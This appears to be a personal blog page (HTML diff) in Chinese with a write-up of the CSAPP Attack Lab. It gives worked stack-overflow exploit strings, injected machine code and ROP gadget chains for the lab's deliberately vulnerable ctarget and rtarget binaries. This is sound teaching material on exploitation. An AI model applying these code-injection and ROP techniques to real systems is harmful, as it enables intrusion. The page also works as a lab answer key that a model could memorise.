@@ -1,0 +1,856 @@
+<!doctype html>
+
+
+
+  
+
+
+<html class="theme-next muse use-motion">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+  <link href="/vendors/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css"/>
+
+
+
+
+  <link href="//fonts.googleapis.com/css?family=Lato:300,400,700,400italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+
+
+
+<link href="/vendors/font-awesome/css/font-awesome.min.css?v=4.4.0" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=0.5.0" rel="stylesheet" type="text/css" />
+
+
+  <meta name="keywords" content="Assembly,CSAPP,Lab," />
+
+
+
+
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=0.5.0" />
+
+
+
+
+
+
+<meta name="description" content="PrerequisiteRedirct
+
+
+Command
+Functions
+
+
+
+
+command &amp;gt; filename
+command标准输出重定向filename
+
+
+command &amp;gt;&amp;gt; filename
+command标准输出重定向filename（追加）
+
+
+command &amp;lt; filename
+command以filename作为标准输入
+
+
+command">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CSAPP Lab3 - Attack Lab">
+<meta property="og:url" content="http://yoursite.com/2016/05/12/CSAPP-Lab3-Attack-Lab/index.html">
+<meta property="og:site_name" content="Over The River, To The Sea">
+<meta property="og:description" content="PrerequisiteRedirct
+
+
+Command
+Functions
+
+
+
+
+command &amp;gt; filename
+command标准输出重定向filename
+
+
+command &amp;gt;&amp;gt; filename
+command标准输出重定向filename（追加）
+
+
+command &amp;lt; filename
+command以filename作为标准输入
+
+
+command">
+<meta property="og:updated_time" content="2016-05-13T07:34:53.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="CSAPP Lab3 - Attack Lab">
+<meta name="twitter:description" content="PrerequisiteRedirct
+
+
+Command
+Functions
+
+
+
+
+command &amp;gt; filename
+command标准输出重定向filename
+
+
+command &amp;gt;&amp;gt; filename
+command标准输出重定向filename（追加）
+
+
+command &amp;lt; filename
+command以filename作为标准输入
+
+
+command">
+
+
+
+<script type="text/javascript" id="hexo.configuration">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    scheme: 'Muse',
+    sidebar: '[object Object]',
+    fancybox: true,
+    motion: true,
+    duoshuo: {
+      userId: 0,
+      author: 'Author'
+    }
+  };
+</script>
+
+  <title> CSAPP Lab3 - Attack Lab | Over The River, To The Sea </title>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="en">
+
+  
+
+
+
+
+
+
+  
+  
+    
+  
+
+  <div class="container one-collumn sidebar-position-left page-post-detail ">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-meta ">
+  
+
+  <div class="custom-logo-site-title">
+    <a href="/"  class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <span class="site-title">Over The River, To The Sea</span>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+  <p class="site-subtitle">Zhang Yi's Memo of Studying Programming</p>
+</div>
+
+<div class="site-nav-toggle">
+  <button>
+    <span class="btn-bar"></span>
+    <span class="btn-bar"></span>
+    <span class="btn-bar"></span>
+  </button>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu ">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-home fa-fw"></i> <br />
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives" rel="section">
+            
+              <i class="menu-item-icon fa fa-archive fa-fw"></i> <br />
+            
+            Archives
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            
+              <i class="menu-item-icon fa fa-tags fa-fw"></i> <br />
+            
+            Tags
+          </a>
+        </li>
+      
+
+      
+      
+      
+    </ul>
+  
+
+  
+</nav>
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                CSAPP Lab3 - Attack Lab
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            <span class="post-meta-item-icon">
+              <i class="fa fa-calendar-o"></i>
+            </span>
+            <span class="post-meta-item-text">Posted on</span>
+            <time itemprop="dateCreated" datetime="2016-05-12T09:46:57+08:00" content="2016-05-12">
+              2016-05-12
+            </time>
+          </span>
+
+          
+
+          
+            
+          
+
+          
+
+          
+          
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="Prerequisite"><a href="#Prerequisite" class="headerlink" title="Prerequisite"></a>Prerequisite</h1><h2 id="Redirct"><a href="#Redirct" class="headerlink" title="Redirct"></a>Redirct</h2><table>
+<thead>
+<tr>
+<th style="text-align:center">Command</th>
+<th style="text-align:center">Functions</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">command &gt; filename</td>
+<td style="text-align:center">command标准输出重定向filename</td>
+</tr>
+<tr>
+<td style="text-align:center">command &gt;&gt; filename</td>
+<td style="text-align:center">command标准输出重定向filename（追加）</td>
+</tr>
+<tr>
+<td style="text-align:center">command &lt; filename</td>
+<td style="text-align:center">command以filename作为标准输入</td>
+</tr>
+<tr>
+<td style="text-align:center">command &lt; filename1 &gt; filename2</td>
+<td style="text-align:center">command以filename1作为标准输入，输出重定向到filename2</td>
+</tr>
+<tr>
+<td style="text-align:center">cat filename \</td>
+<td style="text-align:center">./exec</td>
+<td>cat是连接文件，顺序读取文件并写入标准输出。</td>
+</tr>
+<tr>
+<td style="text-align:center"></td>
+<td style="text-align:center">\</td>
+<td>是管道，将前面程序的标准输出作为后面程序的标准输入</td>
+</tr>
+</tbody>
+</table>
+<h2 id="gdb_u4E2D_uFF0C_u4E24_u79CD_u65B9_u5F0F_u8BBE_u7F6E_u53C2_u6570"><a href="#gdb_u4E2D_uFF0C_u4E24_u79CD_u65B9_u5F0F_u8BBE_u7F6E_u53C2_u6570" class="headerlink" title="gdb中，两种方式设置参数"></a>gdb中，两种方式设置参数</h2><ul>
+<li>set args input.txt</li>
+</ul>
+<ul>
+<li>run &lt; input.txt          (此种情况需先设断点)</li>
+</ul>
+<h2 id="u7F16_u8BD1_u6B65_u9AA4_uFF08_u6BCF_u4E00_u6B65_u4EE5_u4E0A_u4E00_u6B65_u8F93_u51FA_u4E3A_u8F93_u5165_uFF09"><a href="#u7F16_u8BD1_u6B65_u9AA4_uFF08_u6BCF_u4E00_u6B65_u4EE5_u4E0A_u4E00_u6B65_u8F93_u51FA_u4E3A_u8F93_u5165_uFF09" class="headerlink" title="编译步骤（每一步以上一步输出为输入）"></a>编译步骤（每一步以上一步输出为输入）</h2><ol>
+<li>Preprocessor: 处理#include，macro，#define等</li>
+<li>Compiler: 生成汇编语言文件 *.s</li>
+<li>Assembler: 生成二进制object-code文件 *.o。该文件包含所有指令的binary sequence，但是全局变量地址未填充</li>
+<li>Linker：合并若干object-code及调用的library，生成可执行文件</li>
+</ol>
+<h2 id="u5BF9_u5E94_u7684gcc_u3001objdump_u547D_u4EE4"><a href="#u5BF9_u5E94_u7684gcc_u3001objdump_u547D_u4EE4" class="headerlink" title="对应的gcc、objdump命令"></a>对应的gcc、objdump命令</h2><ol>
+<li><p>gcc -S: 使用 <em>.c源文件生成汇编语言文件 </em>.s</p>
+</li>
+<li><p>gcc -c: 使用 <em>.s或 </em>.c文件生成 *.o文件，得到程序的binary sequence</p>
+<ul>
+<li>vim中，打开文件时加参数-b指定二进制方式打开，否则使用xxd会在文件尾加上0x0a</li>
+</ul>
+</li>
+</ol>
+<ul>
+<li>使用:%!xxd将文件转换成十六进制，使用:%!xxd -r转换为正常模式</li>
+<li>只要执行了xxd就会提示文件被修改</li>
+</ul>
+<ol>
+<li><p>gcc -o <name>: 使用 <em>.c, </em>.s, *.o任意文件生成可执行文件。-o 后面带可执行文件名</name></p>
+</li>
+<li><p>objdump -d: 对 *.o文件或可执行文件进行反汇编，得到binary sequence及其对应的汇编指令</p>
+</li>
+</ol>
+<h1 id="Lab_uFF1A"><a href="#Lab_uFF1A" class="headerlink" title="Lab："></a>Lab：</h1><h2 id="u51C6_u5907"><a href="#u51C6_u5907" class="headerlink" title="准备"></a>准备</h2><ol>
+<li>使用汇编将要执行的命令写成.s文件</li>
+<li>使用gcc编译.s文件，再用objdump -d进行反汇编，得到对应的byte sequence</li>
+<li>Hex2Raw程序将上述十六进制数据（以空格分隔）变成raw格式数据，并作为输入给ctarget和rtaeget<ul>
+<li>Hex2Raw读取文件应采用little-endian顺序</li>
+<li>exploit string不应包含0x0a(‘\n’)，否则会被target认为是中断字符串</li>
+</ul>
+</li>
+<li>每个人的程序中都内置了自己的cookie，可以在cookie.txt中找到</li>
+<li>gdb调试target时，需要加参数-g才能正确运行</li>
+</ol>
+<h2 id="Part_I_3A_Code_Injection_Attacks"><a href="#Part_I_3A_Code_Injection_Attacks" class="headerlink" title="Part I: Code Injection Attacks"></a>Part I: Code Injection Attacks</h2><h3 id="Level_1"><a href="#Level_1" class="headerlink" title="Level 1"></a>Level 1</h3><h4 id="Lab_Content"><a href="#Lab_Content" class="headerlink" title="Lab Content"></a>Lab Content</h4><p>For Phase 1, you will not inject new code. Instead, your exploit string will redirect the program to execute an existing procedure.</p>
+<p>ctarget的getbuf()在test()函数体内执行，如代码</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test</span><span class="params">()</span> </span><br><span class="line"></span>&#123; </span><br><span class="line">  <span class="keyword">int</span> val;</span><br><span class="line">  val = getbuf();</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"No exploit. Getbuf returned 0x%x\n"</span>, val);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>在ctarget中有一个函数touch1()</p>
+<p>此level需要使ctarget执行getbuf()完毕后执行touch1()而不是继续执行test()</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">touch1</span><span class="params">()</span> </span><br><span class="line"></span>&#123;</span><br><span class="line">  vlevel = <span class="number">1</span>; <span class="comment">/* Part of validation protocol */</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Touch1!: You called touch1()\n"</span>);</span><br><span class="line">  validate(<span class="number">1</span>);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h4 id="Solve"><a href="#Solve" class="headerlink" title="Solve"></a>Solve</h4><p>通过设断点得知touch1()地址在0x4017c0。进入getbuf()，栈顶向下移动了0x28，传给Gets()的参数是rsp（mov   %rsp,%rdi）。因此从栈顶开始填40byte的数据，再把0x4017c0按照little-endian写进去。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">01 02 03 04 05 06 07 08&#10;11 12 13 14 15 16 17 18&#10;21 22 23 24 25 26 27 28&#10;31 32 33 34 35 36 37 38&#10;41 42 43 44 45 46 47 48&#10;c0 17 40                        /* touch1() */</span><br></pre></td></tr></table></figure>
+<h3 id="Level_2"><a href="#Level_2" class="headerlink" title="Level 2"></a>Level 2</h3><h4 id="Lab_Content-1"><a href="#Lab_Content-1" class="headerlink" title="Lab Content"></a>Lab Content</h4><p>Phase 2 involves injecting a small amount of code as part of your exploit string.</p>
+<p>在ctarget中有一个函数touch2()</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">touch2</span><span class="params">(<span class="keyword">unsigned</span> val)</span></span><br><span class="line"></span>&#123;</span><br><span class="line">	vlevel = <span class="number">2</span>;       <span class="comment">/* Part of validation protocol */</span></span><br><span class="line">	<span class="keyword">if</span> (val == cookie) &#123;</span><br><span class="line">    	<span class="built_in">printf</span>(<span class="string">"Touch2!:You called touch2(0x%.8x)\n"</span>, val);</span><br><span class="line">		validate(<span class="number">2</span>); </span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    	<span class="built_in">printf</span>(<span class="string">"Misfire:You called touch2(0x%.8x)\n"</span>, val);</span><br><span class="line">		fail(<span class="number">2</span>); </span><br><span class="line">    &#125;</span><br><span class="line">	<span class="built_in">exit</span>(<span class="number">0</span>); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>需要让ctarget执行touch2()而不是回到test()。必须将自己的cookie传给touch2()</p>
+<h4 id="Solve-1"><a href="#Solve-1" class="headerlink" title="Solve"></a>Solve</h4><p>touch2()地址在0x4017ec。将改地址写入callee的return address位置以调用touch2()。要给touch2()，传递参数，x86_64系统下必须将参数写入%rdi。修改test调用getbuf前写入的return address只能跳转到一个位置，本题需要执行修改寄存器和跳转到touch2()两步。</p>
+<p>每次执行ret都会pop然后把跳转到pop出的地址中，因此要执行多个指令，可以：</p>
+<ul>
+<li>从原return address位置开始按执行顺序向栈底方向一次写入要执行命令</li>
+<li>第一个要执行命令后必须有ret，如果调用函数则自带ret，自己写命令在结束后加上ret</li>
+</ul>
+<p>这样，第一条指令执行完后ret会把第二条指令pop出来并执行，以此类推。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">48 c7 c7 fa 97 b9 59        /* mov $0x59b997fa,%rdi   func1 */&#10;c3                          /* retq */&#10;11 12 13 14 15 16 17 18&#10;21 22 23 24 25 26 27 28&#10;31 32 33 34 35 36 37 38&#10;41 42 43 44 45 46 47 48&#10;78 dc 61 55 00 00 00 00     /* jump to func1 */&#10;ec 17 40 00 00 00 00 00     /* touch2() */</span><br></pre></td></tr></table></figure>
+<h3 id="Level_3"><a href="#Level_3" class="headerlink" title="Level 3"></a>Level 3</h3><h4 id="Lab_Content-2"><a href="#Lab_Content-2" class="headerlink" title="Lab Content"></a>Lab Content</h4><p>Phase 3 also involves a code injection attack, but passing a string as argument.</p>
+<p>在ctarget中有函数hexmatch()和touch3()</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Compare string to hex represention of unsigned value */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">hexmatch</span><span class="params">(<span class="keyword">unsigned</span> val, <span class="keyword">char</span> *sval)</span></span><br><span class="line"></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> cbuf[<span class="number">110</span>];</span><br><span class="line">	<span class="comment">/* Make position of check string unpredictable */</span></span><br><span class="line">	<span class="keyword">char</span> *s = cbuf + random() % <span class="number">100</span>;</span><br><span class="line">	<span class="built_in">sprintf</span>(s, <span class="string">"%.8x"</span>, val);</span><br><span class="line">	<span class="keyword">return</span> <span class="built_in">strncmp</span>(sval, s, <span class="number">9</span>) == <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">touch3</span><span class="params">(<span class="keyword">char</span> *sval)</span></span><br><span class="line"></span>&#123;</span><br><span class="line">    vlevel = <span class="number">3</span>;       <span class="comment">/* Part of validation protocol */</span></span><br><span class="line">    <span class="keyword">if</span> (hexmatch(cookie, sval)) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Touch3!: You called touch3(\"%s\")\n"</span>, sval);</span><br><span class="line">        validate(<span class="number">3</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Misfire: You called touch3(\"%s\")\n"</span>, sval);</span><br><span class="line">	fail(<span class="number">3</span>); </span><br><span class="line">    &#125;</span><br><span class="line">	<span class="built_in">exit</span>(<span class="number">0</span>); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>需要让ctarget执行touch3()而不是回到test()。必须将自己的cookie以string的形式传入（从高位到低位排列的8个十六进制数，不要开头的0x）</p>
+<h4 id="Solve-2"><a href="#Solve-2" class="headerlink" title="Solve"></a>Solve</h4><p>touch3()的地址为0x4018fa。把cookie存放首地址存入%rdi。思路和phase2一样，不同的是touch3()接受的参数是char*，因此要把cookie各位以ASCII表示后存入某空间，再把该空间地址赋给%rdi。为避免hexmatch和strncmp覆盖栈内容，将cookie写入test的栈区可防止被覆盖。（callee不会使用到caller的栈）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">48 c7 c7 b0 dc 61 55        /* mov $0x5561dcb0,%rdi   func1 */&#10;c3                          /* retq */&#10;11 12 13 14 15 16 17 18 &#10;21 22 23 24 25 26 27 28&#10;31 32 33 34 35 36 37 38&#10;41 42 43 44 45 46 47 48&#10;78 dc 61 55 00 00 00 00     /* jump to func1 */&#10;fa 18 40 00 00 00 00 00     /* touch3() */&#10;35 39 62 39 39 37 66 61     /* cookie in hex */</span><br></pre></td></tr></table></figure>
+<h2 id="Part_II_3A_Return-Oriented_Programming"><a href="#Part_II_3A_Return-Oriented_Programming" class="headerlink" title="Part II: Return-Oriented Programming"></a>Part II: Return-Oriented Programming</h2><ul>
+<li>使用了Stack Randomization，找不到inject code的存放地点</li>
+<li>Stack readable but not executable</li>
+<li>ROP是指在栈中存的若干byte sequences，称为gadget。每个gadget以0xc3结尾，这是ret指令对应的二进制代码。</li>
+<li>以c7 07 d4 48 89 c7       movl   $0xc78948d4,(%rdi)为例，这一句从4thbyte开始的48 89 c7是movq %rax, %rdi，包含一个gardget</li>
+<li>Your code for RTARGET contains a number of functions similar to the setval_210 function shown above in a region we refer to as the gadget farm. Your job will be to identify useful gadgets in the gadget farm and use these to perform attacks similar to those you did in Phases 2 and 3.</li>
+<li>The gadget farm is demarcated by functions start_farm and end_farm in your copy of rtarget. Do not attempt to construct gadgets from other portions of the program code.</li>
+</ul>
+<h3 id="Level_2-1"><a href="#Level_2-1" class="headerlink" title="Level 2"></a>Level 2</h3><h4 id="Lab_Content-3"><a href="#Lab_Content-3" class="headerlink" title="Lab Content"></a>Lab Content</h4><ul>
+<li>For Phase 4, you will repeat the attack of Phase 2, but do so on program RTARGET using gadgets from your gadget farm.</li>
+</ul>
+<ul>
+<li>All the gadgets you need can be found in the region of the code for rtarget demarcated by the functions <strong>start_farm and mid_farm.</strong></li>
+</ul>
+<h4 id="Solve-3"><a href="#Solve-3" class="headerlink" title="Solve"></a>Solve</h4><p>start_farm在0x401994，end_farm在0x401ab2，touch2在0x4017ec。找到两个gadget完成存参数和跳转两个功能。gadget farm如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x401994 &#60;start_farm&#62;:  0xb8    0x01    0x00    0x00    0x00    0xc3&#10;0x40199a &#60;getval_142&#62;:  0xb8    0xfb    0x78    0x90    0x90    0xc3&#10;0x4019a0 &#60;addval_273&#62;:  0x8d    0x87    0x48    0x89    0xc7    0xc3    0xc3&#10;0x4019a7 &#60;addval_219&#62;:  0x8d    0x87    0x51    0x73    0x58    0x90    0xc3&#10;0x4019ae &#60;setval_237&#62;:  0xc7    0x07    0x48    0x89    0xc7    0xc7    0xc3&#10;0x4019b5 &#60;setval_424&#62;:  0xc7    0x07    0x54    0xc2    0x58    0x92    0xc3&#10;0x4019bc &#60;setval_470&#62;:  0xc7    0x07    0x63    0x48    0x8d    0xc7    0xc3&#10;0x4019c3 &#60;setval_426&#62;:  0xc7    0x07    0x48    0x89    0xc7    0x90    0xc3&#10;0x4019ca &#60;getval_280&#62;:  0xb8    0x29    0x58    0x90    0xc3    0xc3&#10;0x4019d0 &#60;mid_farm&#62;:    0xb8    0x01    0x00    0x00    0x00    0xc3&#10;0x4019d6 &#60;add_xy&#62;:      0x48    0x8d    0x04    0x37    0xc3&#10;0x4019db &#60;getval_481&#62;:  0xb8    0x5c    0x89    0xc2    0x90    0xc3&#10;0x4019e1 &#60;setval_296&#62;:  0xc7    0x07    0x99    0xd1    0x90    0x90    0xc3&#10;0x4019e8 &#60;addval_113&#62;:  0x8d    0x87    0x89    0xce    0x78    0xc9    0xc3&#10;0x4019ef &#60;addval_490&#62;:  0x8d    0x87    0x8d    0xd1    0x20    0xdb    0xc3&#10;0x4019f6 &#60;getval_226&#62;:  0xb8    0x89    0xd1    0x48    0xc0    0xc3&#10;0x4019fc &#60;setval_384&#62;:  0xc7    0x07    0x81    0xd1    0x84    0xc0    0xc3&#10;0x401a03 &#60;addval_190&#62;:  0x8d    0x87    0x41    0x48    0x89    0xe0    0xc3&#10;0x401a0a &#60;setval_276&#62;:  0xc7    0x07    0x88    0xc2    0x08    0xc9    0xc3&#10;0x401a11 &#60;addval_436&#62;:  0x8d    0x87    0x89    0xce    0x90    0x90    0xc3&#10;0x401a18 &#60;getval_345&#62;:  0xb8    0x48    0x89    0xe0    0xc1    0xc3&#10;0x401a1e &#60;addval_479&#62;:  0x8d    0x87    0x89    0xc2    0x00    0xc9    0xc3&#10;0x401a25 &#60;addval_187&#62;:  0x8d    0x87    0x89    0xce    0x38    0xc0    0xc3&#10;0x401a2c &#60;setval_248&#62;:  0xc7    0x07    0x81    0xce    0x08    0xdb    0xc3&#10;0x401a33 &#60;getval_159&#62;:  0xb8    0x89    0xd1    0x38    0xc9    0xc3&#10;0x401a39 &#60;addval_110&#62;:  0x8d    0x87    0xc8    0x89    0xe0    0xc3    0xc3&#10;0x401a40 &#60;addval_487&#62;:  0x8d    0x87    0x89    0xc2    0x84    0xc0    0xc3&#10;0x401a47 &#60;addval_201&#62;:  0x8d    0x87    0x48    0x89    0xe0    0xc7    0xc3&#10;0x401a4e &#60;getval_272&#62;:  0xb8    0x99    0xd1    0x08    0xd2    0xc3&#10;0x401a54 &#60;getval_155&#62;:  0xb8    0x89    0xc2    0xc4    0xc9    0xc3&#10;0x401a5a &#60;setval_299&#62;:  0xc7    0x07    0x48    0x89    0xe0    0x91    0xc3&#10;0x401a61 &#60;addval_404&#62;:  0x8d    0x87    0x89    0xce    0x92    0xc3    0xc3&#10;0x401a68 &#60;getval_311&#62;:  0xb8    0x89    0xd1    0x08    0xdb    0xc3&#10;0x401a6e &#60;setval_167&#62;:  0xc7    0x07    0x89    0xd1    0x91    0xc3    0xc3&#10;0x401a75 &#60;setval_328&#62;:  0xc7    0x07    0x81    0xc2    0x38    0xd2    0xc3&#10;0x401a7c &#60;setval_450&#62;:  0xc7    0x07    0x09    0xce    0x08    0xc9    0xc3&#10;0x401a83 &#60;addval_358&#62;:  0x8d    0x87    0x08    0x89    0xe0    0x90    0xc3&#10;0x401a8a &#60;addval_124&#62;:  0x8d    0x87    0x89    0xc2    0xc7    0x3c    0xc3&#10;0x401a91 &#60;getval_169&#62;:  0xb8    0x88    0xce    0x20    0xc0    0xc3&#10;0x401a97 &#60;setval_181&#62;:  0xc7    0x07    0x48    0x89    0xe0    0xc2    0xc3&#10;0x401a9e &#60;addval_184&#62;:  0x8d    0x87    0x89    0xc2    0x60    0xd2    0xc3&#10;0x401aa5 &#60;getval_472&#62;:  0xb8    0x8d    0xce    0x20    0xd2    0xc3&#10;0x401aab &#60;setval_350&#62;:  0xc7    0x07    0x48    0x89    0xe0    0x90    0xc3&#10;0x401ab2 &#60;end_farm&#62;:    0xb8    0x01    0x00    0x00    0x00    0xc3</span><br></pre></td></tr></table></figure>
+<p>其中</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x4019a7 &#60;addval_219&#62;:  0x8d    0x87    0x51    0x73    0x58    0x90    0xc3</span><br></pre></td></tr></table></figure>
+<p>这一行5th byte开始包含gadget   popl %rax;  nop;  ret;</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x4019a0 &#60;addval_273&#62;:  0x8d    0x87    0x48    0x89    0xc7    0xc3    0xc3</span><br></pre></td></tr></table></figure>
+<p>这一行3th byte开始包含gadget   movq %rax,%rdi</p>
+<p>利用这两条就可以把放在栈顶的参数cookie通过%rax传给%rdi，然后执行touch2()</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">01 02 03 04 05 06 07 08&#10;11 12 13 14 15 16 17 18&#10;21 22 23 24 25 26 27 28&#10;31 32 33 34 35 36 37 38&#10;41 42 43 44 45 46 47 48&#10;ab 19 40 00 00 00 00 00  /* 0x4019a7: 0x8d 0x87 0x51 0x73 0x58 0x90 0xc3, popl %rax */&#10;fa 97 b9 59 00 00 00 00  /* cookie */&#10;a2 19 40 00 00 00 00 00  /* 0x4019a0: 0x8d 0x87 0x48 0x89 0xc7 0xc3 0xc3, movq %rax,%rdi */&#10;ec 17 40 00 00 00 00 00  /* touch2() */</span><br></pre></td></tr></table></figure>
+<h3 id="Level_3-1"><a href="#Level_3-1" class="headerlink" title="Level 3"></a>Level 3</h3><h4 id="Lab_Content-4"><a href="#Lab_Content-4" class="headerlink" title="Lab Content"></a>Lab Content</h4><ul>
+<li>Phase 5 requires you to do an ROP attack on RTARGET to invoke function touch3 with a pointer to a string representation of your cookie.</li>
+<li>To solve Phase 5, you can use gadgets in the region of the code in rtarget demarcated by functions <strong>start_farm and end_farm.</strong></li>
+</ul>
+<h4 id="Solve-4"><a href="#Solve-4" class="headerlink" title="Solve"></a>Solve</h4><ul>
+<li>movl在x86-64上会把高32bit清零，movb和movw则不会改变高8/16bit的值</li>
+</ul>
+<p>gadget中有个add_xy()函数，在gdb中反编译可以看到，它将%rdi和%rsi的值相加后赋给了%rax</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Dump of assembler code for function add_xy:&#10;   0x00000000004019d6 &#60;+0&#62;:     lea    (%rdi,%rsi,1),%rax&#10;   0x00000000004019da &#60;+4&#62;:     retq</span><br></pre></td></tr></table></figure>
+<p>getbuf()刚return回来后将当前%rsp通过%rax存到%rdi，将一个偏移量存到栈上,经过 </p>
+<p>popl %rax -&gt; movl %eax,%edx -&gt; movl %edx,%ecx -&gt;%esi存到%rsi，再调用add_xy即可得到一个指定位置的地址，在这里我们存入cookie in hex。执行mov %rax,%rdi，存入%rdi后调用touch3()即可完成。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">01 02 03 04 05 06 07 08&#10;11 12 13 14 15 16 17 18&#10;21 22 23 24 25 26 27 28&#10;31 32 33 34 35 36 37 38&#10;41 42 43 44 45 46 47 48&#10;06 1a 40 00 00 00 00 00  /* 0x401a03: 0x8d 0x87 0x41 0x48 0x89 0xe0 0xc3, movq %rsp,%rax */&#10;c5 19 40 00 00 00 00 00  /* 0x4019c3: 0xc7 0x07 0x48 0x89 0xc7 0x90 0xc3&#65292;movq %rax,%rdi */&#10;ab 19 40 00 00 00 00 00  /* 0x4019a7: 0x8d 0x87 0x51 0x73 0x58 0x90 0xc3, popl %rax */&#10;48 00 00 00 00 00 00 00  /* offset 0x48 bytes */&#10;dd 19 40 00 00 00 00 00  /* 0x4019db: 0xb8 0x5c 0x89 0xc2 0x90 0xc3, mov %eax,%edx */&#10;69 1a 40 00 00 00 00 00  /* 0x401a68: 0xb8 0x89 0xd1 0x08 0xdb 0xc3, mov %edx, %ecx */&#10;27 1a 40 00 00 00 00 00  /* 0x401a25: 0x8d 0x87 0x89 0xce 0x38 0xc0 0xc3, mov %ecx,%esi */&#10;d6 19 40 00 00 00 00 00  /* 0x4019d6: &#60;add_xy&#62;: 0x48 0x8d 0x04 0x37 0xc3 */&#10;c5 19 40 00 00 00 00 00  /* 0x4019c3: 0xc7 0x07 0x48 0x89 0xc7 0x90 0xc3&#65292;movq %rax,%rdi */&#10;fa 18 40 00 00 00 00 00  /* touch3() */&#10;35 39 62 39 39 37 66 61  /* cookie in hex */</span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+
